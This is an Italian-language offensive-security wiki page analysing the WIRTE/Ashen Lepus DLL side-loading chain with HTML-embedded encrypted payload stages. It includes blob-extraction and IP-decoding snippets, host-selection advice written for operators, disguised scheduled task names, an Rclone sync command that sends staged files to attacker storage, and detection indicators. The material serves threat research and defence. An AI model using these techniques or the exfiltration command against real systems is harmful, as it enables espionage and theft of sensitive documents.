# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica del tradecraft

Ashen Lepus (aka WIRTE) ha reso operativo uno schema ripetibile che combina DLL sideloading, payload HTML a più stadi e backdoor .NET modulari per mantenere la persistenza nelle reti diplomatiche del Medio Oriente. La tecnica è riutilizzabile da qualsiasi operatore perché si basa su:<sup>[[1]](#references)</sup>

- **Social engineering basato su archivi**: PDF innocui invitano i bersagli a scaricare un archivio RAR da un sito di file sharing. L’archivio contiene un EXE per visualizzare documenti dall’aspetto legittimo, una DLL malevola con il nome di una libreria attendibile (ad es. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e un `Document.pdf` esca.
- **Abuso dell’ordine di ricerca delle DLL**: la vittima fa doppio clic sull’EXE, Windows risolve l’importazione della DLL dalla directory corrente e il loader malevolo (AshenLoader) viene eseguito all’interno del processo attendibile, mentre si apre il PDF esca per evitare sospetti.
- **Staging living-off-the-land**: ogni stadio successivo (AshenStager → AshenOrchestrator → moduli) rimane fuori dal disco finché non serve; viene distribuito sotto forma di blob cifrati nascosti in risposte HTML altrimenti innocue.

## Catena di side-loading multi-stadio

1. **EXE esca → AshenLoader**: l’EXE carica AshenLoader tramite sideloading; AshenLoader esegue la ricognizione dell’host, si cifra con AES-CTR e invia i dati con una richiesta POST, usando parametri a rotazione come `token=`, `id=`, `q=` o `auth=`, verso percorsi dall’aspetto simile a un’API (ad es. `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Estrazione HTML**: il C2 rivela lo stadio successivo solo se l’IP client è geolocalizzato nella regione bersaglio e lo `User-Agent` corrisponde all’implant, ostacolando le sandbox. Se i controlli vengono superati, il corpo HTTP contiene un blob `<headerp>...</headerp>` con il payload AshenStager cifrato con Base64/AES-CTR.
3. **Secondo sideload**: AshenStager viene distribuito insieme a un altro binario legittimo che importa `wtsapi32.dll`. La copia malevola iniettata nel binario recupera altro HTML e, questa volta, estrae `<article>...</article>` per ricavare AshenOrchestrator.
4. **AshenOrchestrator**: un controller .NET modulare che decodifica una configurazione JSON in Base64. I campi `tg` e `au` della configurazione vengono concatenati e sottoposti a hash per generare la chiave AES, che decifra `xrk`. I byte risultanti fungono da chiave XOR per ogni blob di modulo scaricato in seguito.
5. **Distribuzione dei moduli**: ogni modulo è descritto tramite commenti HTML che indirizzano il parser verso un tag arbitrario, aggirando le regole statiche che cercano solo `<headerp>` o `<article>`. I moduli includono persistenza (`PR*`), programmi di disinstallazione (`UN*`), ricognizione (`SN`), acquisizione dello schermo (`SCT`) ed esplorazione dei file (`FE`).

### Schema di parsing dei container HTML

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

Anche se i difensori bloccano o rimuovono un elemento specifico, all’operatore basta modificare il tag indicato nel commento HTML per riprendere la distribuzione.<sup>[[1]](#references)</sup>

### Helper per l’estrazione rapida (Python)

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## Parallelismi con l'evasione tramite HTML Staging

Recenti ricerche sullo smuggling HTML (Talos) evidenziano payload nascosti come stringhe Base64 all'interno di blocchi `<script>` negli allegati HTML e decodificati tramite JavaScript in fase di esecuzione.<sup>[[2]](#references)</sup> Lo stesso trucco può essere riutilizzato per le risposte C2: si possono inserire blob cifrati in un tag script (o in un altro elemento DOM) e decodificarli in memoria prima di applicare AES/XOR, facendo apparire la pagina come normale HTML. Talos mostra anche offuscamento a più livelli (rinomina degli identificatori e Base64/Caesar/AES) all'interno dei tag script, una tecnica facilmente adattabile ai blob C2 inseriti nell'HTML.<sup>[[2]](#references)</sup> È rilevante anche un successivo articolo di Talos sul **hidden text salting**: suddividere Base64 con commenti HTML irrilevanti o spazi vuoti basta a mandare in errore i semplici estrattori basati su regex, mantenendo al contempo banale la ricostruzione lato browser.<sup>[[7]](#references)</sup>

## Note sulle varianti recenti (2024-2025)

- Check Point ha osservato campagne WIRTE nel 2024 che facevano ancora affidamento sul sideloading basato su archivi, ma usavano `propsys.dll` (stagerx64) come primo stage. Lo stager decodifica il payload successivo con Base64 + XOR (chiave `53`), invia richieste HTTP con uno `User-Agent` hardcoded ed estrae blob cifrati incorporati tra tag HTML. In un ramo, lo stage è stato ricostruito da un lungo elenco di stringhe IP incorporate, decodificate tramite `RtlIpv4StringToAddressA` e poi concatenate nei byte del payload.<sup>[[3]](#references)</sup>
- OWN-CERT ha documentato strumenti WIRTE precedenti in cui il dropper con `wtsapi32.dll` caricato tramite sideloading proteggeva le stringhe con Base64 + TEA e usava il nome stesso della DLL come chiave di decrittazione; quindi offuscava con XOR/Base64 i dati di identificazione dell'host prima di inviarli al C2.<sup>[[4]](#references)</sup>

## Ricostruzione di stage codificati in IP

Il ramo WIRTE del 2024 basato su `propsys.dll` mostra che il PE successivo non deve necessariamente trovarsi in un unico blob HTML contiguo. Il loader può memorizzare i byte dello stage come stringhe a quartetti puntati e ricostruirli con `RtlIpv4StringToAddressA`, una tecnica strettamente correlata al tradecraft **IPfuscation** di Hive.<sup>[[3]](#references)[[5]](#references)</sup> Dal punto di vista operativo, è utile quando l'attore vuole che la pagina HTML contenga quelli che sembrano innocui IOC o dati di configurazione, anziché un payload Base64 evidente.

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

Se i byte recuperati iniziano con `MZ`, probabilmente hai ricostruito direttamente il PE successivo. In caso contrario, verifica la presenza di un livello iniziale XOR/Base64 o di piccoli blocchi delimitatori tra gli indirizzi.

## Nomi di DLL intercambiabili e rotazione degli host

Una caratteristica importante di questo schema è che **il backend di staging HTML/AES/XOR può rimanere identico mentre cambia solo la coppia usata per il sideloading**. Nel corso di diverse campagne, WIRTE ha alternato `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` e `propsys.dll`, una scelta utile perché:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` e `wtsapi32.dll` sono nomi di DLL Windows comuni, che i difensori si aspettano di trovare in `%System32%` / `%SysWOW64%`.
- Cataloghi pubblici come **HijackLibs** mappano già molti binari che caricano quei nomi di DLL da una directory dell'applicazione copiata, offrendo agli operatori host alternativi senza dover riprogettare lo stager.
- È necessario adattare solo la superficie di export per ciascun host. Il parser HTML, le routine AES/XOR e il module loader di solito possono essere trasferiti invariati in una DLL proxy di forwarding.

Per le attività offensive in laboratorio, significa poter suddividere il problema in **(1) trovare un host firmato e stabile che risolva localmente il nome della DLL scelto** e **(2) riutilizzare la stessa logica di caricamento HTML staged dietro quella DLL**.

## Hardening di crittografia e C2

- **AES-CTR ovunque**: i loader attuali incorporano chiavi a 256 bit e nonce (ad es., `{9a 20 51 98 ...}`) e talvolta aggiungono un livello XOR usando stringhe come `msasn1.dll` prima/dopo la decrittazione.<sup>[[1]](#references)</sup>
- **Variazioni del materiale delle chiavi**: i loader precedenti usavano Base64 + TEA per proteggere le stringhe incorporate, ricavando la chiave di decrittazione dal nome della DLL malevola (ad es., `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Separazione dell'infrastruttura + camuffamento tramite sottodomini**: i server di staging sono separati per tool, ospitati su ASN diversi e talvolta preceduti da sottodomini dall'aspetto legittimo, così la compromissione di uno stage non espone gli altri.
- **Esfiltrazione furtiva dei dati di ricognizione**: i dati enumerati ora includono gli elenchi di Program Files per individuare applicazioni di alto valore e vengono sempre crittografati prima di lasciare l'host.
- **Rotazione degli URI**: i parametri di query e i percorsi REST cambiano tra le campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), rendendo inefficaci le rilevazioni fragili.
- **Vincolo allo User-Agent + reindirizzamenti sicuri**: l'infrastruttura C2 risponde solo a stringhe UA esatte e, altrimenti, reindirizza verso siti legittimi di notizie/salute per mimetizzarsi.
- **Distribuzione con gating**: i server applicano restrizioni geografiche e rispondono solo agli implant autentici. I client non autorizzati ricevono HTML non sospetto.

## Persistenza e ciclo di esecuzione

AshenStager crea attività pianificate che si spacciano per job di manutenzione Windows e vengono eseguite tramite `svchost.exe`, ad es.:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Queste attività riavviano la catena di sideloading all'avvio o a intervalli regolari, consentendo ad AshenOrchestrator di richiedere nuovi moduli senza dover accedere di nuovo al disco.

## Uso di client di sincronizzazione legittimi per l'esfiltrazione

Gli operatori trasferiscono documenti diplomatici in `C:\Users\Public` (leggibile da tutti e non sospetto) tramite un modulo dedicato, quindi scaricano il binario legittimo [Rclone](https://rclone.org/) per sincronizzare quella directory con lo storage controllato dall'attaccante. Unit42 segnala che questa è la prima volta in cui è stato osservato questo attore usare Rclone per l'esfiltrazione, in linea con la tendenza più ampia ad abusare di strumenti legittimi di sincronizzazione per mimetizzarsi nel normale traffico:<sup>[[1]](#references)</sup>

1. **Preparazione**: copiare/raccogliere i file bersaglio in `C:\Users\Public\{campaign}\`.
2. **Configurazione**: distribuire una configurazione di Rclone che punti a un endpoint HTTPS controllato dall'attaccante (ad es., `api.technology-system[.]com`).
3. **Sincronizzazione**: eseguire `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` affinché il traffico assomigli a normali backup su cloud.

Poiché Rclone è ampiamente usato per flussi di lavoro di backup legittimi, i difensori devono concentrarsi sulle esecuzioni anomale (nuovi binari, remote insoliti o sincronizzazioni improvvise di `C:\Users\Public`).

## Indicatori per il rilevamento

- Generare un avviso per i **processi firmati** che caricano inaspettatamente DLL da percorsi scrivibili dagli utenti (filtri Procmon + `Get-ProcessMitigation -Module`), soprattutto quando i nomi delle DLL corrispondono a `netutils`, `srvcli`, `dwampi`, `wtsapi32` o `propsys`.<sup>[[6]](#references)</sup>
- Esaminare le risposte HTTPS sospette alla ricerca di **grandi blocchi Base64 incorporati in tag insoliti** o delimitati da commenti `<!-- TAG: <xyz> -->`.
- Normalizzare prima l'HTML: **rimuovere i commenti e comprimere gli spazi bianchi prima dell'estrazione Base64**, perché le tecniche di evasione basate sul salting del testo nascosto possono suddividere i payload tra i confini dei commenti.
- Estendere la ricerca nell'HTML alle **stringhe Base64 all'interno dei blocchi `<script>`** (staging in stile HTML smuggling), decodificate tramite JavaScript prima dell'elaborazione AES/XOR.
- Cercare chiamate ripetute a **`RtlIpv4StringToAddressA` seguite dall'assemblaggio di buffer**, soprattutto quando le stringhe circostanti sono lunghi elenchi di indirizzi IPv4 anziché veri obiettivi di rete.
- Cercare **attività pianificate** che eseguono `svchost.exe` con argomenti non relativi ai servizi o puntano a directory di dropper.
- Monitorare i **reindirizzamenti C2** che restituiscono payload solo per stringhe `User-Agent` esatte e, altrimenti, rimandano a domini legittimi di notizie/salute.
- Monitorare la comparsa di binari **Rclone** al di fuori delle posizioni gestite dall'IT, di nuovi file `rclone.conf` o di job di sincronizzazione che prelevano dati da directory di staging come `C:\Users\Public`.

## References

- [1] [Ashen Lepus, affiliato ad Hamas, prende di mira entità diplomatiche mediorientali con la nuova suite malware AshTag](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Nascosto tra i tag: approfondimenti sulle tecniche di evasione nell'HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [L'attore di minacce WIRTE, affiliato ad Hamas, prosegue le operazioni in Medio Oriente e passa ad attività dirompenti](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: alla ricerca del tempo perduto](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware usa una nuova tecnica IPfuscation per eludere il rilevamento](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potenziale sideloading di DLL di sistema da percorsi non di sistema](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Aggiungere salting del testo nascosto alle email di minaccia](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
